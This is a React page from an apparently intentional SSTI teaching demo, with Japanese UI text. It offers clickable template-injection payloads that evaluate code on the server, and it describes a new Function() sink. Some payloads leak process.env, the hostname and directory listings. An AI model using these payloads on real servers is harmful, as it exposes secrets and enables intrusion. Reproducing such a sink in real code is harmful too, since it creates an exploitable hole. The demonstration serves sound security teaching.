/**
 * Vulnerability: Server-Side Template Injection (SSTI)
 * Source: form input → POST /api/render
 * Sink: renderTemplate() compiles `<%= expr %>` via `new Function()`
 * CWE-94 · OWASP A03:2021
 *
 * Payloads (use the buttons below):
 *   Hello <%= user %>!                                      benign
 *   <%= 7*7 %>                                              arithmetic — confirms code execution
 *   <%= process.env %>                                      leak server env vars
 *   <%= process.versions %>                                 leak runtime info
 *   <%= require('os').hostname() %>                         host name
 *   <%= require('fs').readdirSync('.') %>                   directory listing
 */
"use client";

import { useState } from "react";

const payloads = [
  { p: "Hello <%= user %>!", note: "通常 — コンテキスト変数の参照" },
  { p: "<%= 7*7 %>", note: "算術 — コード実行を確認" },
  { p: "<%= process.env %>", note: "サーバ環境変数の漏えい" },
  { p: "<%= process.versions %>", note: "ランタイムバージョンの漏えい" },
  { p: "<%= require('os').hostname() %>", note: "ホスト名の漏えい" },
  {
    p: "<%= require('fs').readdirSync('.') %>",
    note: "作業ディレクトリのファイル一覧取得",
  },
];

export default function SstiPage() {
  const [template, setTemplate] = useState("Hello <%= user %>!");
  const [output, setOutput] = useState("");
  const [error, setError] = useState("");

  async function render(e: React.FormEvent) {
    e.preventDefault();
    setError("");
    setOutput("");
    const res = await fetch("/api/render", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ template }),
    });
    const data = await res.json();
    if (data.error) {
      setError(data.error);
      return;
    }
    setOutput(data.output ?? "");
  }

  return (
    <div style={{ padding: 24, fontFamily: "system-ui, sans-serif" }}>
      <h1>SSTI デモ (EJS風テンプレート)</h1>
      <p>
        サーバは <code>&lt;%=</code> と <code>%&gt;</code> に挟まれた式を{" "}
        <code>new Function()</code> 経由で JavaScript として評価する。
        送信した式は Node.js プロセス内で実行される。
      </p>

      <form onSubmit={render} style={{ margin: "16px 0" }}>
        <textarea
          value={template}
          onChange={(e) => setTemplate(e.target.value)}
          rows={4}
          style={{
            width: "100%",
            maxWidth: 720,
            padding: 8,
            fontFamily: "monospace",
            border: "1px solid #888",
          }}
        />
        <div>
          <button type="submit" style={{ padding: "6px 12px", marginTop: 8 }}>
            実行
          </button>
        </div>
      </form>

      <h3>ペイロード例 (クリックで入力欄に反映)</h3>
      <ul style={{ listStyle: "none", padding: 0 }}>
        {payloads.map(({ p, note }) => (
          <li key={p} style={{ margin: "4px 0" }}>
            <button
              type="button"
              onClick={() => setTemplate(p)}
              style={{
                fontFamily: "monospace",
                padding: "4px 8px",
                border: "1px solid #888",
                background: "transparent",
                color: "inherit",
                cursor: "pointer",
                marginRight: 8,
              }}
            >
              {p}
            </button>
            <span style={{ color: "#888" }}>— {note}</span>
          </li>
        ))}
      </ul>

      {error && (
        <pre style={{ background: "#400", color: "#fbb", padding: 12 }}>
          {error}
        </pre>
      )}

      {output && (
        <>
          <h3>レンダリング結果</h3>
          <pre
            style={{
              background: "#111",
              color: "#0f0",
              padding: 12,
              whiteSpace: "pre-wrap",
              wordBreak: "break-all",
            }}
          >
            {output}
          </pre>
        </>
      )}
    </div>
  );
}
